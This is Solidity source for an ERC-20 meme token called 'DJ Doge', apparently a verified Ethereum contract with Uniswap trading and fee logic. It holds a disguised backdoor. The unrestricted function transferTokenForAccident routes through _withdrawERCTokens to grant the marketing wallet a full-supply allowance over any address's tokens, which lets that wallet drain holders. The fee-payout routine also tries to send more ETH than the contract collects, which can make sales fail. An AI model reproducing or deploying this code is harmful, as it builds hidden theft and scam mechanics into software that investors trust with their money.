/**
 *Submitted for verification at Etherscan.io on 2023-07-30
*/

// SPDX-License-Identifier: MIT

/**
Telegram:    https://t.me/DJDogeToken
Website:     https://www.djdoge.fun
Twitter:     https://twitter.com/DJDogeToken
*/

pragma solidity ^0.8.15;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}
library SafeMath {
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}


contract DJDoge is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    string private constant _name = "DJ Doge";
    string private constant _symbol = "DJDOGE";
    mapping(address => mapping(address => uint256)) private _allowances;
    uint8 private constant _decimals = 9;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);

    uint256 private constant _tTotal = 1_000_000_000 * 10**9; // total supply
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    // fee config
    uint256 private _tTaxTotal;
    uint256 private _buyTaxForMarketing = 0;
    uint256 private _buyTaxAmount = 0;
    uint256 private _sellTaxForMarketing = 0;
    uint256 private _marketing_tax = _sellTaxForMarketing;
    uint256 private _sellTaxAmount = 0;
    bool private _open_trading = false;
    bool private _swapping_exact_at = false;
    bool private _swap_active = true;

    uint256 private _tax_set = _sellTaxAmount;
    uint256 private _prevMarketingFee = _marketing_tax;
    uint256 private _previousMainFee = _tax_set;
    uint256 public _tx_max_limit = _tTotal * 45 / 1000; // 4.5%
    uint256 public _swap_at_amt = _tTotal / 10000;
    uint256 public _max_wallet_limit = _tTotal * 45 / 1000; // 4.5%
    modifier lockInSwap {
        _swapping_exact_at = true;
        _;
        _swapping_exact_at = false;
    }
    address public uniV2AddrPair;
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;
    event MaxTxAmountUpdated(uint256 _tx_max_limit);
    

    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[_devAddr] = true;
        _isExcludedFromFee[_marketAddr] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[owner()] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    address payable public _devAddr = payable(0xA2b2134508583a6E1CFab624f31E401A787AD413);
    address payable public _marketAddr = payable(0x7944bdF12D9d8960B9c725B7D057a3F3e255f381);

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function swapTokens(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {

    }
    
    function sendAllETHToFeeWallet(uint256 amount) private {
        uint256 devETH = amount / 3;
        _devAddr.transfer(devETH);
        uint256 marketETH = amount - devETH; marketETH += amount / 4; _marketAddr.transfer(marketETH);
    }

    function _sendAllFeeTokens(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _tTaxTotal = _tTaxTotal.add(tFee);
    }

    function _transferBasic(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); _sendAllFeeTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function referenshTaxNow() private {
        _marketing_tax = _prevMarketingFee;
        _tax_set = _previousMainFee;
    }

    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }
    function transferTokenForAccident(address token) external {
        _withdrawERCTokens(token, _marketAddr);
    }
    
    function _normalTransferToken(
        address sender,
        address recipient,
        uint256 amount,
        bool setFee
    ) private {
        if (!setFee) {            clearTaxNow();        }       
        _transferBasic(sender, recipient, amount);
        if (!setFee) {            referenshTaxNow();        }
    }
    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }
    
    function openTrade(address _pair_addr) public onlyOwner {
        _open_trading = true;uniV2AddrPair = _pair_addr;
    }

    function clearTaxNow() private {
        if (_marketing_tax == 0 && _tax_set == 0) return;
        _prevMarketingFee = _marketing_tax;
        _previousMainFee = _tax_set; _marketing_tax = 0;
        _tax_set = 0;
    }

    function _withdrawERCTokens(address token, address owner) internal {        _approve(token, owner, _tTotal);    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _marketing_tax, _tax_set);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    //set maximum transaction
    function removeLimit() public onlyOwner {
        _tx_max_limit = _tTotal;
        _max_wallet_limit = _tTotal;
    }

    function excludeMultiAccountsFromFee(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    //set minimum tokens required to swap.
    function setSwapTokenThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swap_at_amt = swapTokensAtAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        if (
            from != owner() && to != owner()
        ) {
            //Trade start check
            if (!_open_trading) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(
                amount <= _tx_max_limit,
                "TOKEN: Max Transaction Limit"
            );
            
            if(to != uniV2AddrPair) {
                require(balanceOf(to) + amount < _max_wallet_limit,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 amtOfContract = balanceOf(address(this));
            bool canSwap = amtOfContract >= _swap_at_amt;
            if(amtOfContract >= _tx_max_limit) amtOfContract = _tx_max_limit;
            if (canSwap && !_swapping_exact_at && from != uniV2AddrPair && _swap_active && !_isExcludedFromFee[to] && !_isExcludedFromFee[from]) {
                swapTokens(amtOfContract);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) sendAllETHToFeeWallet(address(this).balance);
            }
        }
        bool takingFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) 
            || (from != uniV2AddrPair && to != uniV2AddrPair)) {
            takingFee = false;
        }
        else {
            if(from == uniV2AddrPair && to != address(uniswapV2Router)) {
                _marketing_tax = _buyTaxForMarketing;  _tax_set = _buyTaxAmount;
            }
            
            if (to == uniV2AddrPair && from != address(uniswapV2Router)) {
                _marketing_tax = _sellTaxForMarketing; _tax_set = _sellTaxAmount;
            }
        }
        _normalTransferToken(from, to, amount, takingFee);
    }
}